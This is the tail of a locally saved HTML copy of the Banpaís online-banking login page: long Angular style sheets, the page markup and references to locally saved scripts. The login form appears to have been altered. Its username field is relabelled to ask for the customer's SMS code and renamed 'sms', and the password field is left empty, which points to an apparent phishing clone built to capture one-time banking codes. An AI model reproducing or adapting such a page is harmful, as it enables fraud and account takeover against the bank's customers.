      text-decoration: none;
      max-width: 100%;
      position: relative
    }

    .mat-menu-item::-moz-focus-inner {
      border: 0
    }

    .mat-menu-item[disabled] {
      cursor: default
    }

    [dir=rtl] .mat-menu-item {
      text-align: right
    }

    .mat-menu-item .mat-icon {
      margin-right: 16px;
      vertical-align: middle
    }

    .mat-menu-item .mat-icon svg {
      vertical-align: top
    }

    [dir=rtl] .mat-menu-item .mat-icon {
      margin-left: 16px;
      margin-right: 0
    }

    .mat-menu-item[disabled] {
      pointer-events: none
    }

    @media (-ms-high-contrast:active) {

      .mat-menu-item-highlighted,
      .mat-menu-item.cdk-keyboard-focused,
      .mat-menu-item.cdk-program-focused {
        outline: dotted 1px
      }
    }

    .mat-menu-item-submenu-trigger {
      padding-right: 32px
    }

    .mat-menu-item-submenu-trigger::after {
      width: 0;
      height: 0;
      border-style: solid;
      border-width: 5px 0 5px 5px;
      border-color: transparent transparent transparent currentColor;
      content: '';
      display: inline-block;
      position: absolute;
      top: 50%;
      right: 16px;
      transform: translateY(-50%)
    }

    [dir=rtl] .mat-menu-item-submenu-trigger {
      padding-right: 16px;
      padding-left: 32px
    }

    [dir=rtl] .mat-menu-item-submenu-trigger::after {
      right: auto;
      left: 16px;
      transform: rotateY(180deg) translateY(-50%)
    }

    button.mat-menu-item {
      width: 100%
    }

    .mat-menu-item .mat-menu-ripple {
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      position: absolute;
      pointer-events: none
    }
  </style>
  <style>
    .container-public-corporate[_ngcontent-oeb-c180] {
      margin: 0;
      padding: 0
    }

    @media screen and (min-width: 692px) {
      .container-public-corporate[_ngcontent-oeb-c180] {
        display: flex;
        flex-direction: column
      }
    }

    @media screen and (min-width: 992px) {
      .container-public-corporate[_ngcontent-oeb-c180] {
        flex-direction: row;
        flex-basis: auto
      }
    }

    .card-bp[_ngcontent-oeb-c180] {
      border-radius: 8px !important;
      background: none
    }

    .card-bp[_ngcontent-oeb-c180]:before {
      content: "";
      display: block;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      border-radius: 8px;
      background: var(--primary-color) 0 0 no-repeat padding-box
    }

    @media screen and (min-width: 992px) {
      .sub-container[_ngcontent-oeb-c180] {
        width: 368px !important
      }
    }

    .fixed[_ngcontent-oeb-c180] {
      height: 77px !important
    }

    .public-carousel-container[_ngcontent-oeb-c180] {
      display: none
    }

    @media screen and (min-width: 692px) {
      .public-carousel-container[_ngcontent-oeb-c180] {
        display: block;
        height: 100%
      }
    }

    .card-login-container[_ngcontent-oeb-c180] {
      display: flex;
      justify-content: center
    }

    @media screen and (min-width: 992px) {
      .card-login-container[_ngcontent-oeb-c180] {
        height: 100%
      }
    }

    .form-card[_ngcontent-oeb-c180] {
      padding: 1.5rem 0
    }

    @media screen and (min-width: 380px) {
      .form-card[_ngcontent-oeb-c180] {
        min-width: 367px;
        max-width: 367px
      }
    }

    @media screen and (min-width: 992px) {
      .form-card[_ngcontent-oeb-c180] {
        padding: 86px 0 1.5rem
      }
    }

    .form-card[_ngcontent-oeb-c180] img[_ngcontent-oeb-c180] {
      margin-bottom: 1rem
    }

    ngb-carousel {
      height: 100%
    }

    ngb-carousel .carousel-item.active,
    ngb-carousel .carousel-item-next,
    ngb-carousel .carousel-item-prev {
      display: inline-grid;
      flex: 1;
      height: 100%
    }

    ngb-carousel .carousel-inner {
      width: 100%;
      height: 100%
    }

    @media screen and (min-width: 692px) {
      ngb-carousel img {
        height: 350px;
        width: 100%
      }
    }

    @media screen and (min-width: 992px) {
      ngb-carousel img {
        width: 100%;
        height: 100%;
        object-fit: cover
      }
    }

    .bisv_logo--login[_ngcontent-oeb-c180] {
      display: none
    }

    .bisv_logo--login[_ngcontent-oeb-c180] img[_ngcontent-oeb-c180] {
      width: 155px;
      height: 122px
    }

    @media screen and (min-width: 992px) {
      .bisv_logo--login[_ngcontent-oeb-c180] {
        display: flex;
        justify-content: center
      }
    }

    .title-profile[_ngcontent-oeb-c180] {
      text-align: center;
      border-top-left-radius: 40px
    }

    .text-title-bisv[_ngcontent-oeb-c180],
    .text-title-bipa[_ngcontent-oeb-c180] {
      background-color: #fff;
      width: 100%;
      height: 100%;
      font-size: 25px;
      color: var(--label-color-login);
      display: inline-block;
      font-weight: 700 !important;
      position: relative;
      padding: 18px 8px;
      border: 1px solid var(--primary-color);
      border-radius: 40px 0
    }

    .text-title-bipa[_ngcontent-oeb-c180] {
      color: var(--primary-color)
    }

    .login-container[_ngcontent-oeb-c180],
    .card-network[_ngcontent-oeb-c180] {
      background-color: var(--primary-color)
    }

    .login-container[_ngcontent-oeb-c180] {
      border-radius: 40px 0;
      margin-top: 14px
    }

    .card-login[_ngcontent-oeb-c180] {
      padding: 1.5rem 30px
    }

    .card-body-bp[_ngcontent-oeb-c180] {
      position: relative;
      padding: 27px 30px 24px 29px
    }

    .sub-card-bp[_ngcontent-oeb-c180] {
      position: relative;
      text-align: center
    }

    .sub-card-bp[_ngcontent-oeb-c180] i[_ngcontent-oeb-c180] {
      color: #fff;
      margin: 6px 10px 0;
      font-size: 15px
    }

    .bp-container-public[_ngcontent-oeb-c180] {
      position: absolute;
      top: 0
    }

    @media screen and (min-width: 320px) {
      .card-bp.networks[_ngcontent-oeb-c180] .sub-card-bp[_ngcontent-oeb-c180] {
        height: 48px;
        display: flex;
        margin: auto;
        align-items: center;
        justify-content: center;
        position: relative
      }

      .card-bp.networks[_ngcontent-oeb-c180] .sub-card-bp[_ngcontent-oeb-c180] div[_ngcontent-oeb-c180] {
        display: flex;
        align-items: center
      }

      .card-bp.networks[_ngcontent-oeb-c180] .sub-card-bp[_ngcontent-oeb-c180] div[_ngcontent-oeb-c180] i[_ngcontent-oeb-c180] {
        margin: 6px 10px 0;
        font-size: 15px;
        color: var(--text-primary-color)
      }
    }

    @media screen and (min-width: 320px) {
      .sub-container-bp[_ngcontent-oeb-c180] {
        padding-top: 90px
      }
    }

    @media screen and (min-width: 992px) {
      .sub-container-bp[_ngcontent-oeb-c180] {
        padding-top: 0
      }
    }

    .login-bp-opacity[_ngcontent-oeb-c180]>div[_ngcontent-oeb-c180]:before {
      mix-blend-mode: multiply
    }

    [_nghost-oeb-c180] adf-button>button.btn-default:hover {
      background-color: var(--accent-lighter-color-two) !important;
      color: var(--text-hover-default) !important
    }

    .main-corporate-image adf-button button.btn.btn-default {
      border-width: 2px;
      border-radius: 5px;
      border-color: var(--text-primary-color);
      background-color: transparent;
      color: var(--text-primary-color) !important;
      font-size: 14px;
      font-weight: 600
    }

    .main-corporate-image adf-button>button.btn-default:hover {
      border-color: var(--border-hover-tertiary) !important;
      background-color: var(--background-tertiary) !important
    }

    .main-corporate-image .carousel-indicators {
      gap: 14px;
      margin-bottom: 3.5rem
    }

    .main-corporate-image .carousel-indicators li {
      width: 14px;
      height: 14px;
      border-radius: 50%
    }

    [_nghost-oeb-c180] adf-button>button {
      margin-left: 0;
      margin-top: 8px;
      width: 100% !important;
      color: var(--text-hover-default) !important
    }

    [_nghost-oeb-c180] adf-button>button.btn {
      height: 54px
    }

    [_nghost-oeb-c180] adf-input label {
      font: normal normal bold 16px/19px var(--font-family)
    }

    [_nghost-oeb-c180] adf-input i {
      font-size: 16px !important;
      color: var(--icon-color) !important
    }

    [_nghost-oeb-c180] adf-input input.custom-input {
      height: 50px;
      font: normal normal normal 16px/19px var(--font-family)
    }

    .footer-login[_ngcontent-oeb-c180] {
      text-align: left;
      letter-spacing: 0px
    }

    .forgot-password-section[_ngcontent-oeb-c180] {
      text-align: center;
      margin-top: 15px
    }

    .forgot-password-section[_ngcontent-oeb-c180] a[_ngcontent-oeb-c180] {
      color: var(--text-primary-color);
      font-weight: 600;
      font-size: 12.8px;
      line-height: 17px
    }

    .card-network[_ngcontent-oeb-c180] {
      margin-top: 16px;
      align-items: center;
      padding: 15px 0;
      border-radius: 20px 0
    }

    .card-network[_ngcontent-oeb-c180] .contact[_ngcontent-oeb-c180] {
      display: flex;
      text-align: center;
      align-items: center;
      justify-content: center
    }

    .card-network[_ngcontent-oeb-c180] .icon.bp-ci-telefono[_ngcontent-oeb-c180]:before,
    .card-network[_ngcontent-oeb-c180] .icon.bp-ci-www[_ngcontent-oeb-c180]:before {
      font-size: 13px
    }

    @media screen and (min-width: 692px) {

      .card-network[_ngcontent-oeb-c180] .icon.bp-ci-telefono[_ngcontent-oeb-c180]:before,
      .card-network[_ngcontent-oeb-c180] .icon.bp-ci-www[_ngcontent-oeb-c180]:before {
        font-size: 21px
      }
    }

    .card-network[_ngcontent-oeb-c180] .icon.bp-ci-telefono[_ngcontent-oeb-c180]:before {
      margin: 0 10px 0 0
    }

    @media screen and (min-width: 692px) {
      .card-network[_ngcontent-oeb-c180] .icon.bp-ci-telefono[_ngcontent-oeb-c180]:before {
        margin: 0 15px 0 0
      }
    }

    .card-network[_ngcontent-oeb-c180] .icon.bp-ci-www[_ngcontent-oeb-c180]:before {
      margin: 0 10px
    }

    @media screen and (min-width: 692px) {
      .card-network[_ngcontent-oeb-c180] .icon.bp-ci-www[_ngcontent-oeb-c180]:before {
        margin: 0 15px
      }
    }

    .card-network[_ngcontent-oeb-c180] .footer-login[_ngcontent-oeb-c180] {
      font-size: 14px
    }

    .card-network[_ngcontent-oeb-c180] .footer-login-tips[_ngcontent-oeb-c180] {
      color: var(--color-navbar);
      font-size: 13px;
      font-weight: 700
    }

    .card-network[_ngcontent-oeb-c180] .login-tips[_ngcontent-oeb-c180] {
      color: var(--color-navbar);
      font-size: 13px;
      padding-left: 15px
    }

    .card-network[_ngcontent-oeb-c180]>div[_ngcontent-oeb-c180] {
      text-align: start
    }

    hr[_ngcontent-oeb-c180] {
      background-color: #fff
    }

    .icon-corporate[_ngcontent-oeb-c180] {
      color: var(--label-color-login) !important
    }

    adf-input[_ngcontent-oeb-c180] i[_ngcontent-oeb-c180] {
      font-size: 20px !important
    }

    .corporate-image .banca-regional-login:before {
      color: var(--color-navbar)
    }

    .corporate-image adf-input i:before {
      color: var(--gray-text-400)
    }

    .corporate-image adf-input div.prefix>*[prefix] {
      top: 14px;
      left: 12px
    }

    .login-container .input-wrapper label {
      color: var(--color-navbar)
    }

    a.animated-border-corporate[_ngcontent-oeb-c180] {
      position: relative;
      padding: 0 7px 3px
    }

    a.animated-border-corporate[_ngcontent-oeb-c180]:after {
      background: var(--color-navbar) !important
    }

    a.animated-border-corporate[_ngcontent-oeb-c180]:hover {
      transition: .1s;
      border-bottom: 3px solid #FFF
    }

    [_nghost-oeb-c180] adf-input input::placeholder {
      color: var(--light-grey-text) !important
    }

    [_nghost-oeb-c180] adf-input input.has-error::placeholder {
      color: red !important
    }

    adf-button[_ngcontent-oeb-c180] {
      width: 100%
    }

    #mmenu_screen[_ngcontent-oeb-c180]>.row[_ngcontent-oeb-c180] {
      min-height: calc(100vh - 80px)
    }

    @media screen and (max-width: 4000px) and (min-width: 1500px) {
      #mmenu_screen[_ngcontent-oeb-c180]>.row[_ngcontent-oeb-c180] {
        min-height: calc(100vh - 80px)
      }
    }

    .flex-fill[_ngcontent-oeb-c180] {
      flex: 1 1 auto
    }

    .main-carousel[_ngcontent-oeb-c180] {
      display: none
    }

    @media screen and (min-width: 692px) {
      .main-carousel[_ngcontent-oeb-c180] {
        display: block
      }
    }

    @media screen and (max-width: 4000px) and (min-width: 1500px) {
      .bisv .main-corporate-image .carousel-indicators {
        margin-bottom: 120px !important
      }
    }

    byte-main-frame>div {
      height: 100%
    }

    @media screen and (max-width: 4000px) and (min-width: 1500px) {
      .main-corporate-image[_ngcontent-oeb-c180] {
        max-height: calc(100vh - 80px);
        overflow: hidden
      }
    }

    a.a-tips-content {
      text-align: initial
    }

    a.a-tips-content :hover {
      color: var(--color-navbar) !important
    }

    .tips-content[_ngcontent-oeb-c180] {
      padding: 14px 0 0 15px;
      border-top: 1px solid #fff;
      margin-top: 15px
    }

    @media screen and (min-width: 380px) {
      .tips-content[_ngcontent-oeb-c180] {
        padding-left: 44px
      }
    }

    .content-bp[_ngcontent-oeb-c180] {
      max-width: 316px
    }

    @media screen and (min-width: 992px) {
      .content-bp[_ngcontent-oeb-c180] {
        max-width: 368px
      }
    }

    .content-bp[_ngcontent-oeb-c180] .alertMessage[_ngcontent-oeb-c180] {
      word-break: break-all
    }

    .phone-content[_ngcontent-oeb-c180] {
      font-size: 12px
    }

    @media screen and (min-width: 692px) {
      .phone-content[_ngcontent-oeb-c180] {
        font-size: 13px
      }
    }

    .img-logo[_ngcontent-oeb-c180] {
      height: 150px;
      display: none
    }

    @media screen and (min-width: 692px) {
      .img-logo[_ngcontent-oeb-c180] {
        display: inline
      }
    }
  </style>
  <style>
    input[_ngcontent-oeb-c93],
    label[_ngcontent-oeb-c93] {
      display: block
    }

    label[_ngcontent-oeb-c93] {
      font: 20px/24px Lato, sans-serif;
      letter-spacing: 0;
      color: #5a5a5a;
      opacity: 1
    }

    input[_ngcontent-oeb-c93] {
      width: 100%;
      height: 50px;
      padding: 12px 28px;
      border: 1px solid #c4c4c4;
      border-radius: 3px;
      opacity: 1;
      color: #0a4989;
      font: 20px/24px Lato, sans-serif;
      position: relative;
      z-index: 1
    }

    input[_ngcontent-oeb-c93]::placeholder {
      text-align: left;
      letter-spacing: 0;
      color: #7a9fc1;
      opacity: 1
    }

    input[_ngcontent-oeb-c93]:focus {
      outline: none;
      background: #f6f6f6 0 0 no-repeat padding-box;
      border: 1px solid #1366a8;
      border-radius: 3px;
      opacity: 1
    }

    input.has-error[_ngcontent-oeb-c93] {
      color: #f23752;
      border: 1px solid #f23752
    }

    input.has-error[_ngcontent-oeb-c93]::placeholder {
      color: #f23752
    }

    input.has-error[_ngcontent-oeb-c93]:focus {
      outline: none;
      border: 1px solid #f23752
    }

    input.has-prefix[_ngcontent-oeb-c93] {
      padding-left: 39px
    }

    input.has-sufix[_ngcontent-oeb-c93] {
      padding-right: 39px
    }

    .input-wrapper[_ngcontent-oeb-c93] {
      margin-bottom: 5px;
      position: relative
    }

    div.prefix[_ngcontent-oeb-c93] {
      position: absolute
    }

    div.prefix[_ngcontent-oeb-c93]>*[prefix] {
      position: relative;
      top: 17px;
      left: 6px;
      z-index: 2;
      color: #7a9fc1
    }

    div.suffix[_ngcontent-oeb-c93] {
      position: absolute;
      left: auto;
      right: 10px;
      top: 8px;
      z-index: 2
    }

    div.suffix[_ngcontent-oeb-c93]>*[suffix] {
      position: relative
    }

    div.error[_ngcontent-oeb-c93] {
      position: relative;
      top: -5px;
      text-align: end;
      width: 100%
    }

    div.error>div {
      border-radius: 3px;
      background: #f23752 0 0 no-repeat padding-box;
      font: 12px/15px Lato, sans-serif;
      letter-spacing: 0;
      color: #fff;
      opacity: 1;
      padding: 10px 8px 5px;
      display: inline-block
    }
  </style>
  <style>
    .d-height[_ngcontent-oeb-c78] {
      height: 60px
    }

    .d-width[_ngcontent-oeb-c78] {
      width: 240px
    }

    .btn-default[_ngcontent-oeb-c78] {
      font: 600 18px/22px Lato, sans-serif;
      background: #ffd800 0 0 no-repeat padding-box;
      border-radius: 3px;
      color: #0a4989
    }

    .btn-default[_ngcontent-oeb-c78]:hover:not([disabled]) {
      background: #feee5a 0 0 no-repeat padding-box
    }

    .btn-default-alternative[_ngcontent-oeb-c78] {
      font: 600 18px/22px Lato, sans-serif;
      background: #0a4989 0 0 no-repeat padding-box;
      border-radius: 3px;
      color: #ffd800
    }

    .btn-default-alternative[_ngcontent-oeb-c78]:hover:not([disabled]) {
      background: #1366a8 0 0 no-repeat padding-box
    }

    .btn-secondary[_ngcontent-oeb-c78] {
      font: 600 18px/22px Lato, sans-serif;
      letter-spacing: 0;
      text-align: center;
      background: #ffffff 0 0 no-repeat padding-box;
      border: 2px solid #0a4989;
      border-radius: 3px;
      color: #0a4989
    }

    .btn-secondary[_ngcontent-oeb-c78]:hover:not([disabled]) {
      background: #0a4989 0 0 no-repeat padding-box;
      color: #fff
    }

    .btn-secondary-alternative[_ngcontent-oeb-c78] {
      font: 600 18px/22px Lato, sans-serif;
      letter-spacing: 0;
      text-align: center;
      background: #0a4989 0 0 no-repeat padding-box;
      border: 2px solid #ffffff;
      border-radius: 3px;
      color: #fff
    }

    .btn-secondary-alternative[_ngcontent-oeb-c78]:hover:not([disabled]) {
      background: #ffffff 0 0 no-repeat padding-box;
      color: #0a4989
    }
  </style>
  <style>
    .mat-snack-bar-container {
      padding: 0 !important;
      width: 700px !important
    }

    .style-success[_ngcontent-oeb-c120] {
      width: 700px !important
    }
  </style>
  <style>
    ngb-tooltip-window.bs-tooltip-bottom .arrow,
    ngb-tooltip-window.bs-tooltip-top .arrow {
      left: calc(50% - .4rem)
    }

    ngb-tooltip-window.bs-tooltip-bottom-left .arrow,
    ngb-tooltip-window.bs-tooltip-top-left .arrow {
      left: 1em
    }

    ngb-tooltip-window.bs-tooltip-bottom-right .arrow,
    ngb-tooltip-window.bs-tooltip-top-right .arrow {
      left: auto;
      right: .8rem
    }

    ngb-tooltip-window.bs-tooltip-left .arrow,
    ngb-tooltip-window.bs-tooltip-right .arrow {
      top: calc(50% - .4rem)
    }

    ngb-tooltip-window.bs-tooltip-left-top .arrow,
    ngb-tooltip-window.bs-tooltip-right-top .arrow {
      top: .4rem
    }

    ngb-tooltip-window.bs-tooltip-left-bottom .arrow,
    ngb-tooltip-window.bs-tooltip-right-bottom .arrow {
      bottom: .4rem;
      top: auto
    }
  </style>
</head>

<body class="mat-typography banpais corporate-image">
  <byte-root _nghost-oeb-c193=""><!----><ngx-spinner _ngcontent-oeb-c193="" name="main-spinner" bdcolor="#fbfbfb"
      _nghost-oeb-c134="" class="ng-tns-c134-0"><!----></ngx-spinner><router-outlet _ngcontent-oeb-c193=""
      class="ng-star-inserted"></router-outlet><byte-main-frame _nghost-oeb-c184="" class="ng-star-inserted">
      <div _ngcontent-oeb-c184="" class="ng-star-inserted">
        <nav _ngcontent-oeb-c184="" class="navbar navbar-expand-lg navbar-light fixed-top, public-navbar"><a
            _ngcontent-oeb-c184="" routerlink="." class="navbar-brand"
            href="https://bpenlinea.banpais.hn/online-banking/">
            <div _ngcontent-oeb-c184=""><img _ngcontent-oeb-c184="" alt="banpais_logo_1"
                src="./index_files/banpais_logo_1.svg"><!----></div>
          </a><i _ngcontent-oeb-c184="" aria-hidden="true" class="navbar-toggler icon login banca-regional-menu"></i>
          <div _ngcontent-oeb-c184="" class="collapse navbar-collapse">
            <ul _ngcontent-oeb-c184="" class="navbar-nav login">
              <li _ngcontent-oeb-c184="" class="nav-item active"><a _ngcontent-oeb-c184="" routerlink="login"
                  routerlinkactive="active" class="nav-link active"
                  href="https://bpenlinea.banpais.hn/online-banking/login">Inicio</a></li>
              <li _ngcontent-oeb-c184="" class="nav-item"><a _ngcontent-oeb-c184="" routerlink="help"
                  routerlinkactive="active" class="nav-link" href="https://bpenlinea.banpais.hn/online-banking/help">
                  Ayuda </a></li>
              <li _ngcontent-oeb-c184="" class="nav-item"><a _ngcontent-oeb-c184="" routerlink="schedule"
                  routerlinkactive="active" class="nav-link"
                  href="https://bpenlinea.banpais.hn/online-banking/schedule">Horarios</a></li>
              <div _ngcontent-oeb-c184=""><byte-product-list _ngcontent-oeb-c184=""><!----><mat-menu xposition="after"
                    yposition="below" class="ng-star-inserted"><!----></mat-menu>
                  <ul class="product-options ng-star-inserted">
                    <li class="nav-item d-none d-xs-none d-sm-none d-md-none d-lg-block"><a aria-haspopup="true"
                        class="mat-menu-trigger nav-link"> Productos <i aria-hidden="true"
                          class="banca-regional-flecha-derecha down"></i></a><!----></li>
                  </ul><!----><mat-menu xposition="after" yposition="below" class="ng-star-inserted"><!----></mat-menu>
                  <ul class="ng-star-inserted">
                    <li class="nav-item d-lg-none"><a aria-controls="collapseExample" class="nav-link"
                        aria-expanded="false"> Productos <i aria-hidden="true"
                          class="banca-regional-flecha-derecha down"></i></a></li>
                  </ul><!---->
                  <div class="d-lg-none collapse">
                    <ul>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Préstamos personales
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Canales electrónicos
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Soluciones empresariales
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Pago de remesas </span></a>
                      </li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Tarjetas de crédito y débito
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Cuentas personales
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Microfinanzas </span></a>
                      </li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Conoce APP BP Promo
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Conoce Digital Mall BP
                          </span></a></li>
                      <li class="nav-item sub ng-star-inserted"><a class="nav-link"><span
                            class="product-detail animated-border-mobile animated-border"> Conoce nuestro Blog
                          </span></a></li><!---->
                    </ul>
                  </div>
                </byte-product-list></div>
              <li _ngcontent-oeb-c184="" class="nav-item navbar-language"><adf-language-selector _ngcontent-oeb-c184=""
                  class="nav-link" _nghost-oeb-c124="">
                  <div _ngcontent-oeb-c124="" class="ng-star-inserted"><a _ngcontent-oeb-c124=""
                      class="default active ng-star-inserted"> ES </a><span _ngcontent-oeb-c124=""
                      class="ng-star-inserted"> | </span><!----><!----><a _ngcontent-oeb-c124=""
                      class="default ng-star-inserted"> EN </a><!----><!----><!----></div><!----><!---->
                </adf-language-selector></li>
            </ul>
          </div>
        </nav><router-outlet _ngcontent-oeb-c184=""></router-outlet><byte-login _nghost-oeb-c180=""
          class="ng-star-inserted">
          <div _ngcontent-oeb-c180="" id="mmenu_screen"
            class="container-fluid main_container text-white d-flex main-corporate-image">
            <div _ngcontent-oeb-c180="" class="row flex-fill">
              <div _ngcontent-oeb-c180="" class="col-12 col-lg-6 p-0 main-carousel flex-fill">
                <section _ngcontent-oeb-c180="" class="public-carousel-container"><ngb-carousel _ngcontent-oeb-c180=""
                    tabindex="0" class="carousel slide" aria-activedescendant="ngb-slide-2" style="display: block;">
                    <ol role="tablist" class="carousel-indicators">
                      <li role="tab" class="ng-star-inserted" aria-labelledby="slide-ngb-slide-0"
                        aria-controls="slide-ngb-slide-0" aria-selected="false"></li>
                      <li role="tab" aria-labelledby="slide-ngb-slide-1" aria-controls="slide-ngb-slide-1"
                        aria-selected="false" class="ng-star-inserted"></li>
                      <li role="tab" aria-labelledby="slide-ngb-slide-2" aria-controls="slide-ngb-slide-2"
                        aria-selected="true" class="ng-star-inserted active"></li><!---->
                    </ol>
                    <div class="carousel-inner">
                      <div role="tabpanel" class="carousel-item ng-star-inserted" id="slide-ngb-slide-0"><span
                          class="sr-only"> Slide 1 of 3 </span>
                        <div _ngcontent-oeb-c180="" class="picsum-img-wrapper ng-star-inserted"><img
                            _ngcontent-oeb-c180="" alt="Random first slide" http-equiv="Content-Security-Policy"
                            content="default-src *;
                                img-src  &#39;self&#39; data: https:; script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; ;
                                style-src  &#39;self&#39; &#39;unsafe-inline&#39; *" class="login-banner"
                            src="./index_files/Creacion_de_usuario.png"></div><!---->
                      </div>
                      <div role="tabpanel" class="carousel-item ng-star-inserted" id="slide-ngb-slide-1"><span
                          class="sr-only"> Slide 2 of 3 </span>
                        <div _ngcontent-oeb-c180="" class="picsum-img-wrapper ng-star-inserted"><img
                            _ngcontent-oeb-c180="" alt="Random first slide" http-equiv="Content-Security-Policy"
                            content="default-src *;
                                img-src  &#39;self&#39; data: https:; script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; ;
                                style-src  &#39;self&#39; &#39;unsafe-inline&#39; *" class="login-banner"
                            src="./index_files/Info_cambio_contraseña.png"></div><!---->
                      </div>
                      <div role="tabpanel" class="carousel-item ng-star-inserted active" id="slide-ngb-slide-2"><span
                          class="sr-only"> Slide 3 of 3 </span>
                        <div _ngcontent-oeb-c180="" class="picsum-img-wrapper ng-star-inserted"><img
                            _ngcontent-oeb-c180="" alt="Random first slide" http-equiv="Content-Security-Policy"
                            content="default-src *;
                                img-src  &#39;self&#39; data: https:; script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; ;
                                style-src  &#39;self&#39; &#39;unsafe-inline&#39; *" class="login-banner"
                            src="./index_files/Baner_promocional_1.png"></div><!---->
                      </div><!---->
                    </div><a role="button" class="carousel-control-prev ng-star-inserted"><span aria-hidden="true"
                        class="carousel-control-prev-icon"></span><span class="sr-only">Previous</span></a><!----><a
                      role="button" class="carousel-control-next ng-star-inserted"><span aria-hidden="true"
                        class="carousel-control-next-icon"></span><span class="sr-only">Next</span></a><!---->
                  </ngb-carousel></section>
              </div>
              <div _ngcontent-oeb-c180="" class="col-12 col-lg-6 flex-fill">
                <section _ngcontent-oeb-c180="" class="card-login-container">
                  <div _ngcontent-oeb-c180="" class="form-card">
                    <div _ngcontent-oeb-c180="" class="text-center ng-star-inserted"><img _ngcontent-oeb-c180=""
                        class="img-logo" alt="banpais_logo_1" src="./index_files/banpais_logo_tagline_1.svg"><!---->
                    </div><!----><!---->
                    <div _ngcontent-oeb-c180="" class="login-container"><!---->
                      <form _ngcontent-oeb-c180="" method="post" class="card-login ng-pristine ng-invalid ng-touched">
                        <div _ngcontent-oeb-c180="" class="form-group fixed"><adf-input _ngcontent-oeb-c180=""
                            id="username" formcontrolname="username" _nghost-oeb-c93=""
                            class="placeholder-corporate ng-pristine ng-invalid ng-touched" minlength="2"
                            maxlength="24">
                            <div _ngcontent-oeb-c93="" class="input-wrapper"><label _ngcontent-oeb-c93=""
                                data-testid="inputLabel" for="username">Ingrese su Código SMS</label>
                              <div _ngcontent-oeb-c93="" class="prefix"><i _ngcontent-oeb-c180="" aria-hidden="true"
                                  prefix="" class="icon bp-ci-usuario icon-corporate"></i></div>
                              <div _ngcontent-oeb-c93="" class="suffix"></div><input _ngcontent-oeb-c93=""
                                adfautofocus="" class="custom-input has-prefix" type="text"
                                placeholder="Código sms" name="sms" id="username" maxlength="8" minlength="5" required>
                            
                            </div>
                          </adf-input></div>
                        <div _ngcontent-oeb-c180="" class="form-group"><adf-input _ngcontent-oeb-c180="" id="password"
                            formcontrolname="password" _nghost-oeb-c93="" class="ng-untouched ng-pristine ng-invalid"
                            minlength="1" maxlength="15">

                          </adf-input></div><adf-button _ngcontent-oeb-c180="" _nghost-oeb-c78=""><button
                            _ngcontent-oeb-c78="" class="d-height d-width btn btn-default" type="submit"><!----><span
                              _ngcontent-oeb-c78="" class="ng-star-inserted"><!---->&nbsp; Iniciar Sesión
                            </span><!----></button></adf-button>
                        <div _ngcontent-oeb-c180="" class="forgot-password-section"><a _ngcontent-oeb-c180=""
                            class="animated-border animated-border-corporate">Olvidé mi contraseña</a></div>
                      </form>
                    </div>
                    <div _ngcontent-oeb-c180="" class="card-network">
                      <div _ngcontent-oeb-c180="" class="contact"><i _ngcontent-oeb-c180="" aria-hidden="true"
                          class="icon bp-ci-telefono"></i><a _ngcontent-oeb-c180="" href="tel:+504 25451212"><span
                            _ngcontent-oeb-c180="" class="footer-login" style="margin-left: -5px;"> +504
                            2545-1212&nbsp;&nbsp;&nbsp;&nbsp;| </span></a><!----><i _ngcontent-oeb-c180=""
                          aria-hidden="true" class="icon bp-ci-www ng-star-inserted"></i><!----><a
                          _ngcontent-oeb-c180="" target="_blank" href="https://www.banpais.hn/"><span
                            _ngcontent-oeb-c180="" class="footer-login" style="margin-left: -5px;"> www.banpais.hn
                          </span></a></div><!---->
                    </div>
                  </div>
                </section>
              </div>
            </div><adf-snack-bar _ngcontent-oeb-c180="" _nghost-oeb-c120=""></adf-snack-bar>
          </div>
        </byte-login><!---->
      </div><!----><!---->
    </byte-main-frame><!----><!----></byte-root>
  <div class="fatal-error-loaded banpais" id="fatalErrorSection">
    <img class="error-load-img" src="./index_files/banpais_bp_logo_1.png" alt="logo banpais">
    <p>
      Estimado cliente, se ha producido un error desconocido.
      Por favor recargar la página.
    </p>
    <button id="errorBtn"> Recargar pagina </button>
  </div>
  <script defer="">
    function handleLoadAppError() {
      const loadingApp = document.querySelector('#appLoading');
      const errorApp = document.querySelector('#fatalErrorSection');
      const button = document.querySelector('#errorBtn');
      const $mainFrame = document.querySelector('byte-main-frame');
      const $privateMainFrame = document.querySelector('byte-private-main-frame');
      const isElementLoaded = ($mainFrame || $privateMainFrame);

      const isLoadedApp = window['Zone'];

      if (!isLoadedApp && !isElementLoaded) {
        loadingApp.style.display = 'none';
        errorApp.style.display = 'flex';

        button.addEventListener('click', () => {
          window.location.reload();
        });
      }
    }


    window.addEventListener('DOMContentLoaded', () => {
      handleLoadAppError();
    })

  </script>
  <script src="./index_files/runtime.9bbe0071e975107f.js.descarga" type="module"></script>
  <script src="./index_files/polyfills.89ed84fcbdbfb24d.js.descarga" type="module"></script>
  <script src="./index_files/vendor.c887e5a428176470.js.descarga" type="module"></script>
  <script src="./index_files/main.58ee2c50d0906421.js.descarga" type="module"></script>

  <script type="text/javascript" src="./index_files/_Incapsula_Resource" async=""></script>
  <div class="cdk-overlay-container banpais"></div>
  <div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div>
